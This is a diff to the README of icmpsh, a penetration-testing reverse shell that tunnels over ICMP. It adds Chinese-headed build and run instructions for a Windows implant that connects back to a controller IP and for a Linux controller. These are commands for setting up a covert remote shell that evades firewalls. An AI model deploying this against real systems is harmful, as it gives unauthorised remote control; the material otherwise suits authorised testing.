@@ -1,3 +1,13 @@
+## 编译与运行
+```
+windwos下被控端
+    gcc icmpsh-s.c aes.c aes.h lib.h  -O1 -static  -o icmpsh-s.exe
+    icmpsh-s.exe -t 192.168.1.111 -d 2000 -s 1024
+
+linux控制端
+    gcc icmpsh-m.c lib.h aes.h aes.c -o icmpsh-m
+```
+
 ## Background
 
 Sometimes, network administrators make the penetration tester's life harder. Some of them do use firewalls for what they are meant to, surprisingly!
